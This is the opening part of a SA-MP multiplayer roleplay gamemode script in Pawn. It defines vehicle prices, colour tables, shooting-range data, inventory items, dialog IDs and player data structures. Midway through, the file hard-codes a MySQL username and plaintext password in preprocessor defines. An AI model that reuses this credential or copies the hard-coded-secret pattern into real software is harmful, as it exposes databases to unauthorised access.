/* GAMEMODE CREATED BY Crayder (Giorgi Medzvelia)
Garaji:
SetVehicleVirtualWorld(i,1);
LinkVehicleToInterior(i,18);

Universiteti
pObraz1 - Iuridiuli
pObraz3 - Med Universiteti
pObraz4 - Jurnalistis
*/
AntiDeAMX()
{
	new a[][] = {"Unarmed (Fist)","Brass K"};
 	#pragma unused a
}
#include <a_samp>
#include <a_mysql>
#include <sscanf2>
#include <streamer>
#include <yom_buttons>
#include <Vectoral_Vector>
#include <progress>

#if !defined TRUE
	new stock
	bool:TRUE = true;
#endif

#if !defined FALSE
	new stock
	bool:FALSE = false;
#endif

#if !defined NULL
	new stock
	NULL[2] = {1, 0};
#endif

enum vI { Name[32],MI,Float:TS,Float:AR,Float:HL,Price,Float:MSpeed };
new VehiclesIndent[64][vI] = {
	{"Bravura",401,160.0,150.0,170.0,70000,99.0},
	{"Buffalo",402,200.0,280.0,150.0,120000,160.0},
	{"Perenniel",404,150.0,120.0,180.0,85000,81.0},
	{"Sentinel",405,165.0,240.0,140.0,90000,124.0},
	{"Manana",410,160.0,190.0,200.0,72000,77.0},
	{"Infernus",411,240.0,300.0,160.0,300000,227.0},
	{"Voodoo",412,160.0,230.0,160.0,90000,131.0},
	{"Esperanto",419,160.0,180.0,120.0,102000,102.0},
	{"Washington",421,180.0,210.0,100.0,122000,109.0},
	{"Premier",426,200.0,220.0,140.0,117000,138.0},
	{"Banshee",429,200.0,300.0,160.0,150000,187.0},
	{"Previon",436,160.0,180.0,160.0,83000,102.0},
	{"Stallion",439,160.0,230.0,140.0,88000,131.0},
	{"Admiral",445,165.0,220.0,145.0,118000,123.0},
	{"Turismo",451,240.0,300.0,160.0,200000,172.0},
	{"Solair",458,165.0,200.0,100.0,89000,114.0},
	{"Glendale",466,160.0,220.0,140.0,96000,99.0},
	{"Oceanic",467,160.0,160.0,140.0,95000,91.0},
	{"Hermes",474,160.0,180.0,100.5,100000,102.0},
	{"Sabre",475,160.0,240.0,130.0,100000,138.0},
	{"ZR-350",477,200.0,280.0,160.0,120000,160.0},
	{"Regina",479,165.0,160.0,150.0,87000,90.0},
	{"Comet",480,200.0,300.0,160.0,140000,157.0},
	{"Virgo",491,160.0,180.0,130.0,102000,102.0},
	{"Greenwood",492,160.0,200.0,140.0,100000,91.0},
	{"Blista",496,200.0,260.0,200.0,123000,122.0},
	{"Mesa",500,160.0,240.0,150.0,110000,91.0},
	{"Super GT",506,230.0,260.0,50.0,140000,148.0},
	{"Elegant",507,165.0,200.0,100.0,125000,127.0},
	{"Nebula",516,165.0,200.0,100.0,113000,114.0},
	{"Majestic",517,165.0,220.0,100.0,105000,114.0},
	{"Buccaneer",518,160.0,240.0,150.0,105000,124.0},
	{"Fortune",526,160.0,200.0,100.0,85000,115.0},
	{"Cadrona",527,160.0,200.0,50.0,83000,102.5},
	{"Willard",529,160.0,180.0,150.0,103000,102.0},
	{"Feltzer",533,200.0,280.0,250.0,125000,128.5},
	{"Remington",534,160.0,230.0,50.0,103000,131.0},
	{"Slamvan",535,160.0,40.0,100.0,91000,115.0},
	{"Blade",536,160.0,240.0,50.0,107000,138.0},
	{"Vincent",540,160.0,180.0,200.0,103000,102.0},
	{"Bullet",541,230.0,300.0,100.0,195000,190.0},
	{"FCR-900",521,160.0,240.0,100.0,170000,124.0},
	{"NRG-500",522,160.0,220.0,100.0,220000,99.5},
	{"PCJ-600",461,160.0,180.0,250.0,130000,102.5},
	{"Primo",547,160.0,180.0,170.0,77000,94.0},
	{"Tampa",549,160.0,240.0,100.0,77000,108.5},
	{"Sunrise",550,160.0,170.0,50.0,108000,96.5},
	{"Merit",551,165.0,220.0,100.0,100000,114.0},
	{"Windsor",555,180.0,300.0,100.0,101000,115.5},
	{"Uranus",558,200.0,200.0,50.0,98000,112.0},
	{"Jester",559,200.0,280.0,100.0,130000,145.5},
	{"Sultan",560,200.0,280.0,50.0,145000,132.0},
	{"Stratum",561,200.0,200.0,100.0,120000,109.0},
	{"Elegy",562,200.0,280.0,50.0,155000,146.0},
	{"Flash",565,200.0,240.0,100.0,123000,125.5},
	{"Tahoma",566,160.0,240.0,100.0,108000,118.0},
	{"Tornado",576,160.0,200.0,100.0,109000,114.5},
	{"Stafford",580,165.0,240.0,150.0,121000,108.0},
	{"Emperor",585,165.0,210.0,200.0,111000,108.0},
	{"Euros",587,200.0,240.0,50.0,115000,125.0},
	{"Club",589,200.0,300.0,100.0,113000,122.0},
	{"Picador",600,165.0,250.0,200.0,97000,105.0},
	{"Alpha",602,200.0,230.0,50.0,115000,132.0},
	{"Phoenix",603,200.0,260.0,50.0,160000,135.5}
};
new vehplayer[MAX_PLAYERS];
new VehSelectNum[MAX_PLAYERS];
new Text:VehSelect[12];
new PlayerText:VehSelectPl[MAX_PLAYERS][5];
new TutStep[MAX_PLAYERS];
new cenaj[MAX_PLAYERS];
new	Text:RegisterLoginTD[MAX_PLAYERS];
new LST[MAX_PLAYERS];
new Text:ColorTD[20];
new PlayerText:ColorTDPl[MAX_PLAYERS][7];
new PrimaryColor[MAX_PLAYERS];
new SecondaryColor[MAX_PLAYERS];
new RepaintValue[MAX_PLAYERS];
new bool:ChangedPrimaryColor[MAX_PLAYERS];
new bool:ChangedSecondaryColor[MAX_PLAYERS];
new RGBArray[256] = {
	0x000000FF, 0xF5F5F5FF, 0x2A77A1FF, 0x840410FF, 0x263739FF, 0x86446EFF, 0xD78E10FF, 0x4C75B7FF, 0xBDBEC6FF, 0x5E7072FF,
	0x46597AFF, 0x656A79FF, 0x5D7E8DFF, 0x58595AFF, 0xD6DAD6FF, 0x9CA1A3FF, 0x335F3FFF, 0x730E1AFF, 0x7B0A2AFF, 0x9F9D94FF,
	0x3B4E78FF, 0x732E3EFF, 0x691E3BFF, 0x96918CFF, 0x515459FF, 0x3F3E45FF, 0xA5A9A7FF, 0x635C5AFF, 0x3D4A68FF, 0x979592FF,
	0x421F21FF, 0x5F272BFF, 0x8494ABFF, 0x767B7CFF, 0x646464FF, 0x5A5752FF, 0x252527FF, 0x2D3A35FF, 0x93A396FF, 0x6D7A88FF,
	0x221918FF, 0x6F675FFF, 0x7C1C2AFF, 0x5F0A15FF, 0x193826FF, 0x5D1B20FF, 0x9D9872FF, 0x7A7560FF, 0x989586FF, 0xADB0B0FF,
	0x848988FF, 0x304F45FF, 0x4D6268FF, 0x162248FF, 0x272F4BFF, 0x7D6256FF, 0x9EA4ABFF, 0x9C8D71FF, 0x6D1822FF, 0x4E6881FF,
	0x9C9C98FF, 0x917347FF, 0x661C26FF, 0x949D9FFF, 0xA4A7A5FF, 0x8E8C46FF, 0x341A1EFF, 0x6A7A8CFF, 0xAAAD8EFF, 0xAB988FFF,
	0x851F2EFF, 0x6F8297FF, 0x585853FF, 0x9AA790FF, 0x601A23FF, 0x20202CFF, 0xA4A096FF, 0xAA9D84FF, 0x78222BFF, 0x0E316DFF,
	0x722A3FFF, 0x7B715EFF, 0x741D28FF, 0x1E2E32FF, 0x4D322FFF, 0x7C1B44FF, 0x2E5B20FF, 0x395A83FF, 0x6D2837FF, 0xA7A28FFF,
	0xAFB1B1FF, 0x364155FF, 0x6D6C6EFF, 0x0F6A89FF, 0x204B6BFF, 0x2B3E57FF, 0x9B9F9DFF, 0x6C8495FF, 0x4D8495FF, 0xAE9B7FFF,
	0x406C8FFF, 0x1F253BFF, 0xAB9276FF, 0x134573FF, 0x96816CFF, 0x64686AFF, 0x105082FF, 0xA19983FF, 0x385694FF, 0x525661FF,
	0x7F6956FF, 0x8C929AFF, 0x596E87FF, 0x473532FF, 0x44624FFF, 0x730A27FF, 0x223457FF, 0x640D1BFF, 0xA3ADC6FF, 0x695853FF,
	0x9B8B80FF, 0x620B1CFF, 0x5B5D5EFF, 0x624428FF, 0x731827FF, 0x1B376DFF, 0xEC6AAEFF, 0x000000FF,
	0x177517FF, 0x210606FF, 0x125478FF, 0x452A0DFF, 0x571E1EFF, 0x010701FF, 0x25225AFF, 0x2C89AAFF, 0x8A4DBDFF, 0x35963AFF,
	0xB7B7B7FF, 0x464C8DFF, 0x84888CFF, 0x817867FF, 0x817A26FF, 0x6A506FFF, 0x583E6FFF, 0x8CB972FF, 0x824F78FF, 0x6D276AFF,
	0x1E1D13FF, 0x1E1306FF, 0x1F2518FF, 0x2C4531FF, 0x1E4C99FF, 0x2E5F43FF, 0x1E9948FF, 0x1E9999FF, 0x999976FF, 0x7C8499FF,
	0x992E1EFF, 0x2C1E08FF, 0x142407FF, 0x993E4DFF, 0x1E4C99FF, 0x198181FF, 0x1A292AFF, 0x16616FFF, 0x1B6687FF, 0x6C3F99FF,
	0x481A0EFF, 0x7A7399FF, 0x746D99FF, 0x53387EFF, 0x222407FF, 0x3E190CFF, 0x46210EFF, 0x991E1EFF, 0x8D4C8DFF, 0x805B80FF,
	0x7B3E7EFF, 0x3C1737FF, 0x733517FF, 0x781818FF, 0x83341AFF, 0x8E2F1CFF, 0x7E3E53FF, 0x7C6D7CFF, 0x020C02FF, 0x072407FF,
	0x163012FF, 0x16301BFF, 0x642B4FFF, 0x368452FF, 0x999590FF, 0x818D96FF, 0x99991EFF, 0x7F994CFF, 0x839292FF, 0x788222FF,
	0x2B3C99FF, 0x3A3A0BFF, 0x8A794EFF, 0x0E1F49FF, 0x15371CFF, 0x15273AFF, 0x375775FF, 0x060820FF, 0x071326FF, 0x20394BFF,
	0x2C5089FF, 0x15426CFF, 0x103250FF, 0x241663FF, 0x692015FF, 0x8C8D94FF, 0x516013FF, 0x090F02FF, 0x8C573AFF, 0x52888EFF,
	0x995C52FF, 0x99581EFF, 0x993A63FF, 0x998F4EFF, 0x99311EFF, 0x0D1842FF, 0x521E1EFF, 0x42420DFF, 0x4C991EFF, 0x082A1DFF,
	0x96821DFF, 0x197F19FF, 0x3B141FFF, 0x745217FF, 0x893F8DFF, 0x7E1A6CFF, 0x0B370BFF, 0x27450DFF, 0x071F24FF, 0x784573FF,
	0x8A653AFF, 0x732617FF, 0x319490FF, 0x56941DFF, 0x59163DFF, 0x1B8A2FFF, 0x38160BFF, 0x041804FF, 0x355D8EFF, 0x2E3F5BFF,
	0x561A28FF, 0x4E0E27FF, 0x706C67FF, 0x3B3E42FF, 0x2E2D33FF, 0x7B7E7DFF, 0x4A4442FF, 0x28344EFF
};
#define MAX_TIRS 24
#define NONE_3D_TEXT (Text3D:-1)
new PlayerText:privcar[MAX_PLAYERS];
new Tir_CP[MAX_TIRS];
new Text3D:TirText[MAX_TIRS] = {NONE_3D_TEXT, ...};
new Target_Object[MAX_TIRS];
new PlayerTir[MAX_PLAYERS] = {-1,...};
new TirPlayer[MAX_PLAYERS];
new bool:HitPoint[MAX_PLAYERS][5];
new HitCount[MAX_PLAYERS][5];
new TargetCount[MAX_PLAYERS];
new bool:TirBusy[MAX_TIRS];
new TimerTime[MAX_PLAYERS];
new TargetTimer[MAX_TIRS] = {-1,...};
new TirGun[MAX_PLAYERS];
new player_NoCheckTimeVeh[MAX_PLAYERS];
new Text:TirBGDraw;
new StartCount[MAX_PLAYERS];
new TirAmmo[MAX_PLAYERS];
new bool:TargetGo[MAX_TIRS];
new Float:TargetMoveSpeed[MAX_PLAYERS];
new Text:TirDraw[5];
enum tirinfo
{
	Float:tirPos[3],
	Float:tirTPos[6],
	tirInt,
	tirWorld
}
new TirInfo[][tirinfo] =
{
	{ 	{289.20,-24.89,1001.0},	{289.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{290.79,-24.89,1001.0},	{290.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{292.20,-24.89,1001.0},	{292.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{293.70,-24.89,1001.0},	{293.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{295.29,-24.89,1001.0},	{295.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{296.79,-24.89,1001.0},	{296.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{298.29,-24.89,1001.0},	{298.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{299.79,-24.89,1001.0},	{299.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 0	},
	{ 	{289.20,-24.89,1001.0},	{289.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{290.79,-24.89,1001.0},	{290.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{292.20,-24.89,1001.0},	{292.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{293.70,-24.89,1001.0},	{293.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{295.29,-24.89,1001.0},	{295.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{296.79,-24.89,1001.0},	{296.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{298.29,-24.89,1001.0},	{298.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
	{ 	{299.79,-24.89,1001.0},	{299.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 1	},
    { 	{289.20,-24.89,1001.0},	{289.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{290.79,-24.89,1001.0},	{290.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{292.20,-24.89,1001.0},	{292.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{293.70,-24.89,1001.0},	{293.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{295.29,-24.89,1001.0},	{295.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{296.79,-24.89,1001.0},	{296.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{298.29,-24.89,1001.0},	{298.10000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	},
	{ 	{299.79,-24.89,1001.0},	{299.60000610,-7.7,1000.5,270.0,0.0,0.0}, 1, 2	}
};
enum tirguninfo
{
	tgGunname[30],
	tgGunid,
	tgCost
}
new TGunInfo[][tirguninfo] =
{
    {"Pistols", 22, 10},
	{"Desert Eagle", 24, 15},
	{"ShotGun", 25, 20},
	{"MP5", 29, 25},
	{"AK47", 30, 35},
	{"M4", 31, 35},
	{"Sniper Rifle", 34, 50}
};
//
new PlayerText:RECON[MAX_PLAYERS];
new Menu:specmenu;
new mes[200];
new mes1[200];
new sabajo;
new sabajo2;
new sabajo3;
new sabajo4;
new fbida;
new players;
new mysql;
// Report On
new reporti;
//new STimer[MAX_PLAYERS];
new PlayerText:Inventory[17][MAX_PLAYERS];
enum PlayerInv
{
	invName[MAX_PLAYER_NAME],
	invSlot[21],
	invKol[21],
};
new InventoryPlayer[MAX_PLAYERS][PlayerInv];
enum invPlayer
{
	invName[50],
    invSize,
    invObject,
    invText[200],
};
new Items_All[45][invPlayer] = {
    {"Araferi",0,19461,""},
	{"Golfis Dasartymeli",1,333,""},
	{"Dubinka",2,334,""},
	{"Dana",3,335,""},
	{"Beisbolis Bita",4,336,""},
	{"Shovel",5,337,""},
	{"Katana",6,339,""},
	{"Yvavilebi",7,325,""},
	{"Pistoleti 9MM",8,346,""},
	{"Pistoleti 9MM( Chumi Sasrolit )",9,347,""},
	{"Udabnos Arwivi",10,348,""},
	{"Vinchesteri 'Shotgun'",11,349,""},
	{"Vinchesteri 'Combat Shotgun'",12,351,""},
	{"UZI - Pulimioti 'Micro UZI'",13,352,""},
	{"Pistoleti - Pulimioti 'MP5'",14,353,""},
	{"Pistoleti - Pulimioti 'Tec 9'",15,372,""},
	{"Kalasha 'AK-47'",16,355,""},
	{"M4 'M4'",17,356,""},
	{"Sniper",18,357,""},
	{"Sniper ( Miznit )",19,358,""},
	{"Parashuti",20,371,""},
	{"Kraskis Baloni",21,365,""},
	{"Cecxlsaqrobi",22,366,""},
	{"Kamera",23,367,""},
	{"Broni",24,1242,""},
	{"Narkotiki",25,1241,""}, // 1241
	{"Tansacmeli",26,2704,""},
	{"Pizza",27,19346,""},
	{"Shaurma",28,2769,""},
	{"Hamburgeri",29,19094,""},
	{"Cremlsadeni Gazi",30,343,""}, // 31
	{"Salati",31,2858,""},
	{"Sprunk (Soda)",32,1546,""},
	{"Piva",33,1950,""},
	{"Vodka",34,1668,""},
	{"Brendi",35,1551,""},
	{"Gvino",36,1669,""},
	{"Ruka",37,1581,""},
	{"Medicin",38,1240,""},
	{"Dokumentebi",39,1581,""},
	{"Tansacmeli",40,2704,""},
	{"Fuli",41,1212,""},
	{"Tyviebi",42,2061,""},
	{"Metal",43,1252,""},
	{"Seed",44,19063,""}
};

enum
{
	CHECKPOINT_1,
	CHECKPOINT_2,
	CHECKPOINT_3,
	CHECKPOINT_4,
	CHECKPOINT_5,
	CHECKPOINT_6,
	CHECKPOINT_7,
	CHECKPOINT_8,
	CHECKPOINT_9,
	CHECKPOINT_10,
	CHECKPOINT_11,
	CHECKPOINT_12,
	CHECKPOINT_13
}

#undef MAX_PLAYERS
#define MAX_PLAYERS 300

//#pragma dynamic 8500

#define MYSQLHOST "localhost" // HOST MYSQL
#define MYSQLUSER "admin" // ??? ???????????? MYSQL
#define MYSQLPASS "gocikavar789" // ?????? ???????????? MYSQL
#define MYSQLDABE "server1" // ??? ???? MYSQL

#define SFCM(%0,%1,%2) do{new _s[256];format(_s,256,%2);SendClientMessage(%0,%1,_s) ;}while(FALSE)
#define mysql_empty(%1,%2) mysql_tquery(%1, %2, "", "")
#define FMQ_empty(%0) do{new _s[256];format(_s,256,%0);mysql_tquery(mysql, _s, "", "") ;}while(FALSE)
#define SPFD(%0,%1,%2,%3,%4,%5,%6) do{new _s[256];format(_s,256,%6);ShowPlayerDialog(%0,%1,%2,%3,_s,%4,%5) ;}while(FALSE)
#define RandomEx(%1,%2) (random(%2-%1)+%1)
#define COLOR_NEWS 0xFFA500AA
#define F_BALLAS 3
#define F_GROVE  4
#define F_AZTEC  5
#define F_VAGOS  6
#define F_RIFA   7
#define F_COL  14
#define F_MEX  13
#define F_YAK  12
#define G_STATE_NOT_GAMBLING    0
#define G_STATE_READY           1
#define G_STATE_GAMBLING        2
#define G_STATE_DISPLAY         3
#define G_STATE_PLAY_AGAIN      4
#define PAINT_VALUE 500
// ----------===== [Цвета] =====----------
#define COLOR_BLUE 0x33AAFFFF
#define MAX_SPIED 550
#define COLOR_LIGHTRED 0xFF5030AA
#define COLOR_LIGHTGREEN 0x9ACD32AA
#define CGRAY 0xAFAFAFAA
#define CGREEN 0x33AA33AA
#define CRED 0xFF0000AA
#define CLIGHTRED 0xFF0033FF
#define CYELLOW 0xFFFF00AA
#define CWHITE 0xFFFFFFFF
#define CBLUE 0x4682B4AA
#define CLIGHTBLUE 0x33CCFFAA
#define CORANGE 0xFF9900AA
#define CSYSTEM 0xEFEFF7AA
#define CPINK 0xE75480FF
#define CBRIGHTRED 0xB2222200
#define CDARKGREEN 0x004400AA
#define CLIGHTGREEN 0x00FF00AA
#define CCON_GREEN 0x00FF00FF
#define COLOR_WHITE 0xFFFFFFAA
#define CBROWN 0x8b4513FF
#define CINFO 0x269BD8FF
#define CINFO5 0x739F95FF
#define CBADINFO 0xFF182DFF
#define CADMIN 0xF36223FF
#define CDEPARTMENT 0x007FFFFF
#define CRADIO 0x6B8E23FF
#define cGRAY AFAFAF
#define cGREEN 33AA33
#define cRED FF0000
#define cLIGHTRED FF0033
#define cYELLOW FFFF00
#define cWHITE FFFFFF
#define cBLUE 4682B4
#define cLIGHTBLUE 33CCFF
#define cORANGE FF9900
#define cSYSTEM EFEFF7
#define cPINK E75480
#define cBRIGHTRED B22222
#define cDARKGREEN 004400
#define cLIGHTGREEN 00FF00
#define cCON_GREEN 00FF00
#define cBROWN 8b4513
#define cINFO 269BD8
#define cBADINFO FF182D
#define cDEPARTMENT 007FFF
#define cRADIO 6B8E23
// ----------===== [Licenses] =====----------
#define LIC_DRIVING 0
#define LIC_FLY 1
#define LIC_BOAT 2
#define LIC_WEAP 3
// ----------===== [Типы т/с] =====----------
#define VEHICLE_TYPE_CAR 0
#define VEHICLE_TYPE_BOAT 1
#define VEHICLE_TYPE_PLANE 2
#define VEHICLE_TYPE_PLANE 2
// ----------===== [Основные настройки] =====----------
#define MAX_HOUSE_COUNT 400//Макс. к-во домов
#define HINTS_COUNT 42//Точное к-во хинтов
#define FILLING_COUNT 18//Точное к-во заправок
#define SHOP_OBJECTS 7//Точное к-во предметов в 24/7
//#define REPAIR_OBJECTS 1//Точное к-во предметов в автомастерских
#define FRACTION_COUNT 15 //К-во фракций
#define SUBFRACTION_COUNT 3 //К-во фракций
#define BINT_COUNT 23 //Точное к-во интерьеров бизнесов
#define MAX_BUSINESS_COUNT 80 //Макс к-во бизнесов
#define BUSINESS_TYPE_COUNT 8 //К-во типов бизнесов
#define MAX_ONFOOT_SPEED 80 //Макс скорость, с которой игрок может перемещаться не в транспорте
#define MAX_INCAR_SPEED 180 //Макс скорость, с которой игрок может перемещаться в транспорте
#define ATM_COUNT 8//К-во банкоматов
#define SHOP_COUNT 8//К-во 24/7
#define WANTED_TIME 40//Время исчезновения звезды в минутах
#define JAIL_QUATE 10 //Время заключения в секундах за каждую звезду
#define WARN_TIME 3 //К-во дней до снятия варна
#define MAX_ADVERT_COUNT 15 //Максимальное кол-во объявлений
#define REPAIR_ID_OFFSET 49
#define TELEPORTS_COUNT 48

#define IsKicked(%0) GetPVarInt(%0, "kicked")
// ----------===== [Основные настройки (конец)] =====----------

enum //Диалоги
{
	dMes,
	dCloth,
	dCloth1,
	dFillBuy,
	dTirD,
	dTirD1,
	dBuyKit,
	dRecep,
	dRecep2,
	dInver,
	dSborka,
	dSelo,
	dSelo2,
	dGrain,
	dGrain2,
	dRazvod,
	dGaraj,
	dMeriya,
	dMeriya2,
	dMeriya3,
	dCasino,
	dCasino2,
	dGangJob,
	dMafiaJob,
	dBuygun,
	dBuygun1,
	dBuygun3,
	dBuygun4,
	dBuygun5,
	dBuygun6,
	dBuygun7,
	dBuygun8,
	dBuygun9,
	dPodval,
	dPodval2,
	dRabot,
	dBizLis,
	dLogin,
	dLogin2,
	dRegister,
	dRegister2,
	dRegister22,
	dRegister3,
	dRegister4,
	dRegister5,
	dRegister6,
	dRegister7,
	dRegister8,
	dPlayerMenu,
	dPlayerMenuSecurity,
	dSelowork,
	dCoalwork,
	dWoodwork,
	dGunWork,
	dHire,
	dTaxiRent,
	dCreatehouse1,
	dCreatehouse2,
	dCreatehouse3,
	dHints,
	dHouseInfo,
	dHouseBuy,
	dHouseMenu,
	dHouseImprove,
	dHouseImprove2,
	dHouseStat,
	dSellHouse,
	dBuyCarSalon,
	dBuyCar,
	dBuyCarC1,
	dBuyCarC1Edit,
	dBuyCarC2,
	dBuyCarC2Edit,
	dSellCar,
	dChangePassCode,
	dChangePassPass,
	dChangePass1,
	dChangePass2,
	dCode,
	dCodeMes,
	dCodeSet1,
	dCodeSet2,
	dCodeChange1,
 	dStore,
 	dBizWar,
	dStorePut,
	dStoreGet,
	dStoreDress,
	dStoreSkin,
	dSafe,
	dSafeCode,
	dSafeCodeChange,
	dSafeCodeChange2,
	dSafeAction,
	dSafePutMoney,
	dSafeGetMoney,
	dSafePutDrug,
	dSafeGetDrug,
	dFreez,
	dBuySkin,
	dBuySkin2,
	dGPS,
	dGPSWork,
	dGPSMain,
	dGPSTruck,
	dBuyFood,
	dLeaderskin,
	dMakeleader,
	dInvite,
	dInviteSkin,
	dSetRank,
	dFractionSkin,
	dAutoExam1,
	dAutoExam2,
	dAutoExam3,
	dExamType,
	dAutoTest1,
	dAutoTest2,
	dAutoTest3,
	dAutoTest4,
	dAutoTest5,
	dHeal,
	dReport,
	dCreateOrg,
	dATMWatch,
	dATMGet,
	dShop,
	dShopSim,
	dGangLeader,
	dGangRank,
	dGangRank2,
	dGangCode,
	dSellGangCar,
	dSellGangCar2,
	dCredentials,
	dCredentials2,
	dMakeGun,
	dMakeGun2,
	dBuyGangCar,
	dATMPut,
	dCommandList,
	dCommandShow,
	dCommandMain,
	dBank,
	dBuyShop,
	dBuyShop2,
	dEnterShop,
	dSubleader,
	dStopLoad,
	dService,
	dEmergencyCall,
	dMechRent,
	dTow,
	dUnfill,
	dGobGun,
	dGobAmmo,
	dEmergencyPolice1,
	dEmergencyMedic1,
	dEmergencyMechanic1,
	dBuyBusiness1,
	dBuyBusiness2,
	dBusiness,
	dBusinessStat,
	dBusinessBank,
	dBusinessGet,
	dBusinessPut,
	dBusinessSell,
	dBusinessOrder1,
	dBusinessOrder2,
	dBusinessPrice,
	dBints,
	dBar,
	dAdvertSend,
	dAdvertList,
	dAdvertAction,
	dAdvertEdit,
	dNewsDial,
	dPresentPhone,
	dUnemplyment,
	dDonate,
	dDonateInfo,
	dDonateMoney1,
	dDonateMoney2,
	dDonateNickname1,
	dDonateNickname2,
	dDonateAge1,
	dDonateAge2,
	dStoRAK,
	dStoRAK1,
	dTeleport,
	dTeleport2,
	dYniver4,
	dAnimliber,
	dObshakEd,
	dObshakPt,
	dObshakMn,
	dObshakPttake,
	dObshakPtput,
	dObshakEdput,
	dObshakEdtake,
	dObshakMntake,
	dObshakMnput,
	dObshak,
	dOffMembers,
	dSetSpawn
}

enum //Слоты иконок
{
	iconTaxi
}

enum //Фракции
{
	frLicenser
}

enum (<<=1)//Настройки игрока
{
	setAdminInfo=1,
	setFractionChat,
	setPlayerIDChat,
	setShowNickname
}

enum PDATA
{
	pMysqlID,
	pNickname[32],
	pPassword[32],
	pWarn,
	pMut,
	pBan,
	pSex,
	pAge,
	pSkin,
	pSkin2,
	pFractionSkin,
	Float:pHealth,
	Float:pArmour,
	pHunger,
	pStamina,
	pPower,
	pHouse,
	pOtel,
	pOtelNomer,
	pCar,
	pCarID,
	pLimit,
	pDvijok,
	pKolesocar,
	pOfforg,
	pOffrang,
	pColor1,
	pColor2,
	Float:pFuel,
	pJob,
	pMoney,
	pBank,
	pLevel,
	pExp,
	pPhone,
	pWanted,
	pJail,
	pPrison,
	pDrugs,
	pGrain,
	pAmmo,
	pGunAmount,
	pFraction,
	pSubfraction,
	pRank,
	pBusiness,
	pWatch,
	pCode[32],
	pRequestCode,
	pAdmin,
	pHelper,
	pLicenses[4],
	pBolnica,
	pSpawn,
	pDivorce[32],
	pPistol_Skill,
	pEagle_Skill,
	pShotGun_Skill,
	pMP5_Skill,
	pAK47_Skill,
	pM4_Skill,
	pSniper_Skill,
	pObraz1,
	pObraz3,
	pObraz4,
	pStatus,
	pDonate,
	pVehicleKey,
	pArmyTime,
	pArmyRank
}

enum PTEMP
{
	pGunSkill,
	pWorkSalary,
	pShowLicpl,
	pShowSkillpl,
	pShowPasspl,
	pShowPassact,
	pShowLicact,
	pShowSkillact,
	pTruckWagonID,
	Text3D:pTruckWagonText,
	pTruckWagonTime,
	pTruckWeight,
	pTruckLoadID,
	pTaxiID,
	pTaxiPrice,
	pTaxiTurn[2],
	Text3D:pTaxi3DText,
	pTaxiPass,
	pSelectedHouseID,
	pSellHouseOffer,
	pSellHouseOffee,
	pSellHousePrice,
	pSellHouseID,
	pSettleHouseOffer,
	pSettleHouseOffee,
	pSettleHouseID,
	pSellCarOffer,
	pSellCarOffee,
	pSellCarPrice,
	pSellCarID,
	pSellBusinessOffer,
	pSellBusinessOffee,
	pSellBusinessPrice,
	pSellBusinessID,
	Float:pFillingSpeed,
	Float:pFillingAccel,
	pStoreGun,
	Float:pHealth,
	pEat,
	pOfferFraction,
	pOfferFractionid,
	pTestQNumber,
	Float:pX,
	Float:pX2,
	pSpectatee,
	pCaller,
	pCallee,
	pMechID,
	pMechOffer,
	pMechOffee,
	pMechTrailer,
	pCuffer,
	pCuffee,
	pSelectedBusinessID,
	pEda[9],
	Float:pAcceleration
}

enum ARs
{
    arRecep,
    arKit,
    arGangJob,
    arSelo2,
    arZavodLoad1,
	arZavodLoad2,
	arZavodLoad3,
    arZavod,
    arZavodTS,
    arZavodSklad,
    arZavodSklad2,
    arPoezd[3],
    arSeloVxod[5],
    arMafiaJob[7],
    arMafiaJob1[7],
    arSelo,
	arCoalman,
	arSeloLoad1,
	arSeloLoad2,
	arSeloLoad3,
	arSeloLoad4,
	arSeloLoad5,
	arSeloLoad6,
	arSeloLoad7,
	arSeloLoad8,
	arSeloLoad9,
	arCoalmanLoad1,
	arCoalmanLoad2,
	arWood,
	arWoodLoad1,
	arWoodLoad2,
	arWoodLoad3,
	arWoodLoad4,
	arWoodLoad5,
	arWoodLoad6,
	arWoodLoad7,
	arWoodUnload,
	arGunWork,
	arTruckWagonCoal,
	arTruckUnload,
	arTruckWagonWood,
	arSellCar,
	arFill[FILLING_COUNT],
	arAutoExam,
	arInstructorBarrier,
	arGreenZone[12],
	arPodval,
    arPodval1,
	arGang[5],
	arGangExit,
	arDorm,
	arBank,
	arHire,
	arBarrier[3],
	arArmyAmmo,
	arFbiAmmo,
	arMafiaAmmo,
	arMeriyaAmmo,
	arArrest,
	arGangHP,
	arPDD,
	arPDD1,
	arGangWeap,
	arYniver[3],
	arPoezdExit,
	arTyrmaHP,
	arOtelHP,
	arOtelBAR,
	arCasino
}

enum VEHICLE_DATA
{
	vID,
	vvID,
	Float:vX,
	Float:vY,
	Float:vZ,
	Float: vA,
	bool: vEngine,
	Float:vFuel,
	vLock,
	vProbability,
	vProbability2,
	vColor[2]
}

enum TRANSPORT_DATA
{
	trID,
	trModel,
	trName[35],
	trPrice,
	trTank,
	trConsumption,
	trClass,
	trFuelable,
	trSellable,
	trFuelMark
}

enum CASINO_DATA
{
	casinoID,
	casinoOwner[MAX_PLAYER_NAME],
